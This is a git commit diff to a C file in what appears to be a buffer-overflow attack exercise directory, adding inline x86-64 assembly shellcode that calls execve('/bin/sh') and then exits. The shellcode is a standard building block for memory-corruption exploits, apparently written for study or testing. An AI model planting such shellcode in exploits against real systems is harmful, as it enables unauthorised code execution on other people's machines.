fce1f86c6a9b4235fd83c8fce4844676e28e3df0
zechengh <zcheustc@gmail.com>
2021-03-19 14:23:34 -0400

    mv

--- ad/attack/bufferoverflow/c_test_shell.c
+++ ad/attack/bufferoverflow/c_test_shell.c
@@ -14,9 +14,18 @@ int main(int argc, char **argv)
         "movq    $file_to_run, %rcx\n"
         "movq    $59, %rax\n"                /* syscall arg 1: syscall number execve(59) */
         "movq    %rcx, %rdi\n"               /* syscall arg 2: string pathname */
+        "leaq    8(%rcx), %rsi\n"            /* syscall arg 3: argv ptr to ['/bin/sh']*/
+        "movq    $0, %rdx\n"                 /* syscall arg 4: envp (NULL) */
+        "syscall\n"                          /* Call execve("/bin/sh", ["/bin/sh"], []) */
+
+        "movq    $60, %rax\n"                /* syscall arg 1: SYS_exit (60) */
+        "xorq    %rdi,%rdi\n"                /* syscall arg 2: 0 */
+        "syscall\n"                          /* invoke syscall */
+
         "file_to_run:\n"
         ".ascii  \"/bin/sh\\0\"\n"
-        ".quad   0x0"
+        ".quad   file_to_run\n"
+        ".quad   0x0\n"
 
         //"leaq    8(%rcx), %rsi\n"            /* syscall arg 2: argv ptr to ['/bin/sh']*/
         //"movq    $0, %rdx"                 /* syscall arg 4: envp (NULL) */
